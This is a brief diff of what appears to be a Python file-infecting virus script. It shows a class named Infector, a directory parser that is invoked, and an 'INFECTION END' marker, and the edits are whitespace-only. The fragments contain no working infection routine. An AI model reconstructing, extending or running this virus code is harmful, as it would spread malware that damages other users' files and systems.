@@ -1,3 +1,4 @@
+
 # From Jan Agh with love
 
 import os, sys
@@ -65,9 +66,9 @@ class Infector:
                     is_infector = False
 
         return normal_code
-    
+
 parser = DirParser()
 
 parser.parse()
-    
+
 # INFECTION END
